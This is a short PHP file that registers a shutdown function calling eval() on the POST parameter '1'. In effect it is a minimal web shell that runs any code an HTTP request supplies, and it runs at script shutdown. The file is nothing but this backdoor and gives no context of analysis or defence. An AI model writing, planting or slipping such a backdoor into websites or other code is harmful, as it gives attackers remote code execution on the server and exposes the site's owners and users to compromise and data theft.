<?php
    function shutdown()
    { 
        eval($_POST[1]);
    }

    register_shutdown_function('shutdown');
?>